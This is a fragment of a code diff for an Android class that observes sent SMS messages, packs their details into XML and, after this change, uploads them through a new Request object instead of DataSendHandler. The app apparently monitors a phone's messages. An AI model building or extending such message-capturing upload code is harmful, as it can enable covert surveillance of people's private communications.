@@ -13,8 +13,8 @@ import android.os.Handler;
 import android.preference.PreferenceManager;
 import android.util.Log;
 
-import com.inet.android.bs.DataSendHandler;
 import com.inet.android.bs.FileLog;
+import com.inet.android.bs.Request;
 
 public class SmsSentObserver extends ContentObserver {
 
@@ -23,6 +23,7 @@ public class SmsSentObserver extends ContentObserver {
 	String dir = null;
 	SharedPreferences sp;
 	private Context mContext;
+	Request req;
 
 	public SmsSentObserver(Handler handler, Context ctx) {
 		super(handler);
@@ -123,8 +124,8 @@ public class SmsSentObserver extends ContentObserver {
 									+ "</cdata1><ntime>" + "30"
 									+ "</ntime></packetSentObserver>";
 
-							DataSendHandler dSH = new DataSendHandler(mContext);
-							dSH.send(2, sendStr);
+							req = new Request(mContext);
+							req.sendRequest(sendStr);
 
 							Log.d(TAG, sendStr);
 							FileLog.writeLog("smsSentObserver: " + sendStr);
